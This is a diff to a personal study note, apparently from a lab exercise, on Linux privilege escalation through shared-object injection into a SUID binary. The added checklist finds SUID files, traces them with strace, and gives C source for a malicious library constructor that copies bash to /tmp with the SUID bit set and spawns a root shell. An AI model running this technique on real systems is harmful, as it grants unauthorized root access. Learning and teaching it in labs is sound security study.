@@ -8,7 +8,7 @@ The program must:
 
 # Search for vulnerable program 
 
-First of all we need to execute:
+<mark style="background: #BBFABBA6;">First of all we need to execute:</mark>
 ```bash
 find / -type -f -perm -04000 -ls 2>/dev/null
 ```
@@ -54,7 +54,7 @@ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
 
 In our case it is very interesting:
 - ![[Pasted image 20250117115024.png]]
-- so we try to overwrite it becuase we can access `/home/user`
+- so we try to overwrite it because we can access `/home/user`
 
 
 # Write injection
@@ -96,3 +96,29 @@ At this point we run again the initial program:
 - ![[Pasted image 20250117120005.png]]
 
 <mark style="background: #BBFABBA6;">And we gain root access!</mark>
+
+
+
+- [ ] **List files with the SUID bit set**
+- `find / -perm -u=s -type f 2>/dev/null`
+
+- [ ] **Run these files using `strace`**
+
+- [ ] **Look if we are able to inject `.so` files in the running**
+
+- [ ] **Write and compile a `.so` file**
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+- [ ] **Inject the shared library**
+
+- [ ] **Run the bash file created by the injection**
+
